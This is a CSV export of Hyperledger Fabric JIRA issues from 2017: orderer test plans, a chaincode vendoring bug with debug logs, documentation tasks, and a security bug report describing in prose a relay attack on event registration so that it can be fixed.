"Sequential pausing all the orderers while sending continous traffic to 3 orderers, 4 kafka brokers on 1 channel",FAB-4810,18120,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 5:07 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4810-ORD104-sending txs to 3 orderers, 4 kafka broker on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 500,000 Tx to 3 orderers on 1 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, pause the first orderer, wait for 30 seconds, and then unpause it, waiting for 1 minute period, followed by pausing other orderers (3) Reconnect the broadcast clients to send the transactions and deliver clients to receive both before and after the orderer restarted
 *  *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD104 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3cn:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
boot with non-default value of CORE_PEER_ID named anything besides vp<N>,FAB-4811,18122,16637,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 5:39 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"Test Name: <FAB_xxxx>_<Title>
Component: <use the Component column from the testplan>
Description: verify all peers and orderers can communicate with each other, run e2e test
Artifact Locations: <location of test script and input files>
Network Topology: <number of nodes of each type; use ""standard"" for our standard docker-compose file that is being used for most tests>
Client Driver: <test tool>
Input: <command to run the test>
Output: <key portions of stdout of running the test, showing it passes>",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3cv:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"gRPC API for broadcasts to the orderer, get expected broadcast responses",FAB-4812,18123,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 6:30 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"Name: FAB_4812_grpc_broadcast_200_and_503
 Component: orderer, broadcasts
 Description: gRPC API for broadcasts to the orderer, get expected broadcast response 200 for successful receipt, or 503 when no kafkaservice. (and can we expand to include other error responses?)
 Artifact Locations: fabric/test/feature/orderer.feature
 Network Topology: ""standard"" kafka docker-compose file
 Client Driver: behave
 Input: 
 Output: ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3d3:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"gRPC API for the orderer deliver(), get delivered blocks, or 503 response upon kafka service failure",FAB-4813,18124,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 6:32 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"Name: FAB_4813_grpc_deliver_200_and_503

Component: orderer, deliver
Description: gRPC API for deliverclients receiving blocks from the orderer, get expected response 200 for successful receipt, or 503 when kafkaservice drops.
Artifact Locations: fabric/test/feature/orderer.feature
Network Topology: ""standard"" kafka docker-compose file
Client Driver: behave
Input: 
Output: ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3db:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"TX rejected from peer not yet joined channel, then success after joined",FAB-4814,18125,16637,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 6:35 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"Test Name: TX rejected from peer not yet joined channel, then success after joined
 Component: Orderer
 Description: user registered with CA - org1, sends Tx on channel1 to peer1(org1) when peer1(org1) has not joined channel1 yet (should be rejected). Next, peer1/org1 joins channel1, and send Tx again; it goes through
 Artifact Locations: used e2e_cli  sample and node-sdk balance-transfer sample to verify this 

                             Also can refer https://github.com/asararatnakar/FabricNodeApp1.0
 Network Topology: Standard
 Client Driver: e2e_cli sample/ node-sdk balance-transfer sample
 Input: 
 Output: ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3dj:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TX rejected when user sends on wrong channel,FAB-4815,18126,16637,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 7:21 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"+Test Name+:  FAB_4815_TX rejected when user sends on wrong channel

+Component+: Ordering Service

+Description+: user registered with CA - org1. Peer1/org1 joins only channel1, when peer2/org2 joins channel2. User sends Tx on (incorrect) channel2 to peer1/org1. (should be rejected, since peer1 has not joined channel2)

OR try send on channel2 to peer2/org2 (should be rejected since user is in different org)

+Artifact Locations+: used e2e_cli  sample and node-sdk balance-transfer sample to verify this 

                             Also can refer https://github.com/asararatnakar/FabricNodeApp1.0

+Network Topology+: Standard Network

+Client Driver+: e2e_cli sample/ node-sdk balance-transfer sample

+Input+: 

+Output+: ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3dr:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
user sends zero-length Tx payload  (should be rejected immediately by orderer),FAB-4816,18127,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 7:24 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"Test Name: FAB_4816_user sends zero-length Tx payload (should be rejected immediately by orderer)
 Component: Ordering service
 Description: user sends zero-length Tx payload  (should be rejected immediately by the orderer)
 Artifact Locations: <location of test script and input files>
 Network Topology: Standard network
 Client Driver: node-sdk sample balance-transfer
 Input: <command to run the test>
 Output: <key portions of stdout of running the test, showing it passes>

+Test Name+:  FAB_4817_user sends zero-length Tx payload (should be rejected immediately by orderer)

+Component+:  Ordering service

+Description+:  user sends zero-length Tx payload  (should be rejected immediately by the orderer)
 * Modified node-sdk APIs to test send empty transactions to the orderer
 * verified that transaction is rejected by the Orderer

+Artifact Locations+: Made changes to node-sdk lib to send the malicious transactions

+Network Topology+: Standard Network

+Client Driver+:  Node-SDK

 ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-1017,,,,,,,,,"1|hzy96v:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
user sends  missing or poorly-formatted fields (should be rejected immediately by orderer),FAB-4817,18128,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 7:33 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"+Test Name+:  FAB_4817_missing or poorly-formatted fields in a transaction must be rejected by the orderer

+Component+:  Ordering service

+Description+: user sends  missing or poorly-formatted fields (should be rejected immediately by orderer)
 * Modified node-sdk APIs to test send corrupted/poorley formatted transactions to the orderer
 * verified that transactions are rejected by the Orderer

+Artifact Locations+: Made changes in node-sdk framework to send the malicious transactions

+Network Topology+: Standard Network

+Client Driver+:  Node-SDK

 ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-1017,,,,,,,,,"1|hzy973:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Vendoring bugs in chaincode packaging,FAB-4819,18131,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,shimos,shimos,shimos,16/Jun/17 9:39 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jun/17 8:17 AM,v1.0.0-beta,,,v1.0.0,,fabric-peer,,,,,,0,,,,,,,"In vendoring during packaging a chaincode for deployment, I think I found two bugs:
-	To locate system packages, the GOROOT environment variable is used. Since it might be not set when go is installed in its standard location, it fails in finding system packages
-	To find packages imported from the chaincode, “go list” command is invoked. But its parsing result contains an empty string which is interpreted in turn as the package in CWD.

{noformat}
/opt/gopath/src/github.com/hyperledger/fabric/bddtests$ peer chaincode package -n example02 -c '{""Args"": [""init"", ""a"", ""100"", ""b"", ""200""]}' -p 'github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02' -v test --logging-level debug tmp/outf
2017-06-15 16:27:59.980 PDT [msp] getMspConfig -> INFO 001 intermediate certs folder not found at [/opt/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts]. Skipping.: [stat /opt/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts: no such file or directory]
2017-06-15 16:27:59.980 PDT [msp] getMspConfig -> INFO 002 crls folder not found at [/opt/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts]. Skipping.: [stat /opt/go/src/github.com/hyperledger/fabric/sampleconfig/msp/crls: no such file or directory]
2017-06-15 16:28:00.006 PDT [msp] GetLocalMSP -> DEBU 003 Returning existing local MSP
2017-06-15 16:28:00.006 PDT [msp] GetDefaultSigningIdentity -> DEBU 004 Obtaining default signing identity
2017-06-15 16:28:00.006 PDT [chaincodeCmd] checkChaincodeCmdParams -> INFO 005 Using default escc
2017-06-15 16:28:00.006 PDT [chaincodeCmd] checkChaincodeCmdParams -> INFO 006 Using default vscc
2017-06-15 16:28:00.006 PDT [golang-platform] getCodeFromFS -> DEBU 007 getCodeFromFS github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02
2017-06-15 16:28:00.159 PDT [golang-platform] func1 -> DEBU 008 Discarding GOROOT package fmt
2017-06-15 16:28:00.159 PDT [golang-platform] func1 -> DEBU 009 Discarding provided package github.com/hyperledger/fabric/core/chaincode/shim
2017-06-15 16:28:00.159 PDT [golang-platform] func1 -> DEBU 00a Discarding provided package github.com/hyperledger/fabric/protos/peer
2017-06-15 16:28:00.159 PDT [golang-platform] func1 -> DEBU 00b Discarding GOROOT package strconv
2017-06-15 16:28:00.159 PDT [golang-platform] func1 -> DEBU 00c Discarding GOROOT package
2017-06-15 16:28:00.159 PDT [golang-platform] GetDeploymentPayload -> DEBU 00d done
2017-06-15 16:28:00.160 PDT [chaincodeCmd] chaincodePackage -> DEBU 00e Packaged chaincode into deployment spec of size <2544>, with args = [tmp/outf]
2017-06-15 16:28:00.161 PDT [main] main -> INFO 00f Exiting.....
{noformat}

The line “00c Discarding GOROOT package” shows that empty string is included in imported packages.

{noformat}
/opt/gopath/src/github.com/hyperledger/fabric/bddtests$ GOROOT= peer chaincode package -n example02 -c '{""Args"": [""init"", ""a"", ""100"", ""b"", ""200""]}' -p 'github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02' -v test --logging-level debug tmp/outf
2017-06-15 16:27:48.156 PDT [msp] getMspConfig -> INFO 001 intermediate certs folder not found at [/opt/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts]. Skipping.: [stat /opt/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts
: no such file or directory]
2017-06-15 16:27:48.156 PDT [msp] getMspConfig -> INFO 002 crls folder not found at [/opt/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts]. Skipping.: [stat /opt/go/src/github.com/hyperledger/fabric/sampleconfig/msp/crls: no such file or directory
]
2017-06-15 16:27:48.178 PDT [msp] GetLocalMSP -> DEBU 003 Returning existing local MSP
2017-06-15 16:27:48.178 PDT [msp] GetDefaultSigningIdentity -> DEBU 004 Obtaining default signing identity
2017-06-15 16:27:48.178 PDT [chaincodeCmd] checkChaincodeCmdParams -> INFO 005 Using default escc
2017-06-15 16:27:48.178 PDT [chaincodeCmd] checkChaincodeCmdParams -> INFO 006 Using default vscc
2017-06-15 16:27:48.178 PDT [golang-platform] getCodeFromFS -> DEBU 007 getCodeFromFS github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02
2017-06-15 16:27:48.333 PDT [golang-platform] func1 -> DEBU 008 Accepting import: fmt
2017-06-15 16:27:48.333 PDT [golang-platform] func1 -> DEBU 009 Discarding provided package github.com/hyperledger/fabric/core/chaincode/shim
2017-06-15 16:27:48.333 PDT [golang-platform] func1 -> DEBU 00a Discarding provided package github.com/hyperledger/fabric/protos/peer
2017-06-15 16:27:48.333 PDT [golang-platform] func1 -> DEBU 00b Accepting import: strconv
2017-06-15 16:27:48.333 PDT [golang-platform] func1 -> DEBU 00c Accepting import:
2017-06-15 16:27:48.593 PDT [golang-platform] GetDeploymentPayload -> DEBU 00d processing dep: compress/flate
2017-06-15 16:27:48.593 PDT [golang-platform] GetDeploymentPayload -> DEBU 00e checking: /opt/go/src/compress/flate exists: false
(snip)
2017-06-15 16:27:48.622 PDT [golang-platform] GetDeploymentPayload -> DEBU 0b0 processing dep: github.com/hyperledger/fabric/bccsp/utils
2017-06-15 16:27:48.622 PDT [golang-platform] GetDeploymentPayload -> DEBU 0b1 checking: /opt/go/src/github.com/hyperledger/fabric/bccsp/utils exists: true
2017-06-15 16:27:48.622 PDT [golang-platform] GetDeploymentPayload -> DEBU 0b2 processing dep: github.com/hyperledger/fabric/protos/msp
2017-06-15 16:27:48.622 PDT [golang-platform] GetDeploymentPayload -> DEBU 0b3 checking: /opt/go/src/github.com/hyperledger/fabric/protos/msp exists: true
(snip)
2017-06-15 16:27:49.063 PDT [chaincodeCmd] chaincodePackage -> DEBU 39b Packaged chaincode into deployment spec of size <830302>, with args = [tmp/depo]
2017-06-15 16:27:49.064 PDT [main] main -> INFO 39c Exiting.....
{noformat}

Without GOROOT, it fails to locate system packages, accepting “fmt” and “strconv” as external imports.
Also, as dependencies from “” (empty string, i.e. the CWD, bddtests), many fabric packages are also vendored, resulting in a big deployment package.


As a result, behave tests (bddtest) seems to fail when GOROOT is not set during instantiating a chaincode because the vendored packages lack “shim” :
{noformat}
...(snip)…
    And user ""configAdminPeerOrg0"" using cert alias ""config-admin-cert"" sends proposal ""instantiateProposal1"" to endorsers with timeout of ""90"" seconds with proposal responses ""instantiateProposalResponses""
                # steps/endorser_impl.py:109 29.466s
      | Endorser |
      | peer0    |
      | peer2    |
      Traceback (most recent call last):
        File ""/home/ubuntu/Envs/behave_venv/local/lib/python2.7/site-packages/behave/model.py"", line 1456, in run
          match.run(runner.context)
        File ""/home/ubuntu/Envs/behave_venv/local/lib/python2.7/site-packages/behave/model.py"", line 1903, in run
          self.func(context, *args, **kwargs)
        File ""steps/endorser_impl.py"", line 124, in step_impl
          resultsDict =  dict(zip(endorsers, [respFuture.result() for respFuture in proposalResponseFutures]))
        File ""/home/ubuntu/Envs/behave_venv/local/lib/python2.7/site-packages/grpc/_channel.py"", line 294, in result
          raise self
      _Rendezvous: <_Rendezvous of RPC that terminated with (StatusCode.UNKNOWN, Error starting container: Failed to generate platform-specific docker build: Error returned from build: 2 ""# github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:45: cannot use shim.Error(""Incorrect number of arguments. Expecting 4"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.co
m/hyperledger/fabric/examples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:52: cannot use shim.Error(""Expecting integer value for asset holding"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com
/hyperledger/fabric/examples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:57: cannot use shim.Error(""Expecting integer value for asset holding"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com
/hyperledger/fabric/examples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:64: cannot use shim.Error(err.Error()) (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com/hyperledger/fabric/examples/cha
incode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:69: cannot use shim.Error(err.Error()) (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com/hyperledger/fabric/examples/cha
incode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:72: cannot use shim.Success(nil) (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com/hyperledger/fabric/examples/chaincode
/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:89: cannot use shim.Error(""Invalid invoke function name. Expecting ""invoke"" ""delete"" ""query"""") (type ""github.com/hyperledger/fabric/protos/peer"".Respo
nse) as type ""github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:100: cannot use shim.Error(""Incorrect number of arguments. Expecting 3"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.c
om/hyperledger/fabric/examples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:110: cannot use shim.Error(""Failed to get state"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com/hyperledger/fabric/e
xamples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:113: cannot use shim.Error(""Entity not found"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com/hyperledger/fabric/exam
ples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:113: too many errors
{noformat}
","fabric commit 859fd8a653fca1109f04f7d1e807b73ca0d0f9d2
",fredbi,mastersingh24,muralisr,shimos,toddinpal,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,FAB-4590,FAB-2493,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3e7:",,,,,,,,,,,,,,,,,,,,,,,fredbi,mastersingh24,muralisr,shimos,toddinpal,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jun/17 10:08 AM;shimos;CR: https://gerrit.hyperledger.org/r/#/c/10671/;;;","16/Jun/17 6:58 PM;mastersingh24;
{noformat}
As a result, behave tests (bddtest) seems to fail when GOROOT is not set during instantiating a chaincode because the vendored packages lack “shim” :
{noformat}

We actually don't want to vendor the shim package but the problem with or the protos/peer packages.  ;;;","16/Jun/17 10:59 PM;Clayton Sims;Cr submitted so moving to in review;;;","17/Jun/17 1:11 AM;shimos;Gari Singh : Right, so the purpose of the CR is to make vendoring code not include shim (or other fabric packages).;;;","17/Jun/17 9:06 AM;muralisr;[~shimos] since FAB-2493 we include only external dependencies that are not in fabric runtime (ccenv, host etc). In particular shim and protos are excluded from the package.

So I don't understand the statements (but perhaps I'm missing something ?)

_*many fabric packages are also vendored, resulting in a big deployment package.*_

*_the purpose of the CR is to make vendoring code not include shim (or other fabric packages)_*

 ;;;","17/Jun/17 9:22 AM;shimos;[~muralisr] Maybe I think I did not explain well....

As you said, by FAB-2493, the fabric runtime is supposed to be excluded. But _if GOROOT is not set_, some fabric runtime is actually included due to the bugs I reported in this issue.
The CR is to fix this, making this feature work even if GOROOT is not set. (it is usual not to set GOROOT when you install Go in the standard location);;;","17/Jun/17 9:21 PM;muralisr;[~shimos] thank you for the clarification.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cleanup unused docs and images,FAB-4820,18132,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,16/Jun/17 10:44 AM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,20/Jun/17 6:51 AM,v1.0.0-beta,,,v1.0.0-rc1,,fabric-docs,,,,,,0,Documentation,,,,,,cleanup unused docs and images,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy3ef:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve configtxlator examples and documentation,FAB-4821,18133,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,jyellick,jyellick,16/Jun/17 11:03 AM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,02/Jul/17 1:48 AM,,,,v1.0.0,,fabric-docs,,,,,,0,configtxlator,configuration,,,,,,,baohua,chenxuan,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy3en:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,chenxuan,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jun/17 10:36 PM;jyellick;https://gerrit.hyperledger.org/r/#/c/10689/;;;","21/Jun/17 6:17 PM;baohua;The configtxlator is with very hacker style, but seems it's the only way we can use till now.

Maybe we should let peer support more config update API post v1.0.;;;","21/Jun/17 11:33 PM;jyellick;[~baohua] I totally agree that {{configtxlator}} is not a very polished experience, and the hope is, that it is not a long term solution.  It is anticipated that the SDKs will be enhanced to natively support more configuration manipulation in the future, but {{configtxlator}} was a relatively straightforward stopgap solution for v1.  I'd also agree that we could develop a chaincode for the peer to automate many of the 'out of band' pieces of the flow, but again, for v1 this wasn't practical.;;;","16/Aug/17 11:05 AM;chenxuan;[~jyellick] i think give a picture about the block,envelope,payload,channelheader,signatureheader relationship is a good idea to understand the fabric;;;","16/Aug/17 12:02 PM;baohua;Agree with [~chenxuan].

Would u like to help offer a hand and create a new JIRA issue?

We can put it into related documentation.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"SECURITY Event registration request should not be ""relayable""",FAB-4824,18136,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,wlahti,elli-androulaki,elli-androulaki,16/Jun/17 6:00 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Feb/18 7:33 AM,,,,v1.1.0,,fabric-crypto,fabric-orderer,fabric-peer,fabric-sdk-go,fabric-sdk-py,,0,A&D,ARCH,Release-planning-1.1,sdk,Security,,"This issue was reported by [~yacovm], and respective attacks / solutions discussed with [~angelo.decaro], and [~jimthematrix].

 

This bug has to do with client impersonation attack for event registration that a malicious peer can spawn to escalate its access rights. The attacker in this case would be a peer who had once access to a channel, and after a while its organisation revoked its certificate and should thus be restricted access to the organisation's resources.

 

*Background/source of the problem*:

Essentially event messages that (among others things) serve event registration, and the required requestor authentication/authorisation assessment is based on these messages. 

Event messages contain requestor signature, *but* the message signed is not bound to the underlying connection in which the message was exchanged (e.g., communication parties), and can thus be easily relay-able. That is the recipient of such messages can easily initiate another (TLS) connection with another node (of the same org), and request registration to events using the request once received by a client. Implicitly, that peer would be allowed to _impersonate the message creator._

In particular,  events have the following form:

 
{code:java}
// SignedEvent is used for any communication between consumer and producer
message SignedEvent {
   // Signature over the event bytes
   bytes signature = 1;
   // Marshal of Event object
   bytes eventBytes = 2;
}

//Event is used by
// - consumers (adapters) to send Register
// - producer to advertise supported types and events
message Event {
  //TODO need timestamp

  oneof Event {
    //Register consumer sent event
    Register register = 1;

    //producer events
    common.Block block = 2;
    ChaincodeEvent chaincode_event = 3;
    Rejection rejection = 4;

    //Unregister consumer sent events
    Unregister unregister = 5;
  }
  // Creator of the event, specified as a certificate chain
  bytes creator = 6;
}
{code}
 

*Potential attacks*:

 

*Attack 1*: Alice (client) and Bob( peer), and Charlie (peer) are members of the same org, Org. 
 # Alice (client) connects to Bob(peer) requesting registration to events. 
 # Bob accepts, and stores Alice's registration request, say AliceReq
 # Org revokes Bob
 # Bob contacts Charlie and requests to register for events using AliceReq

 

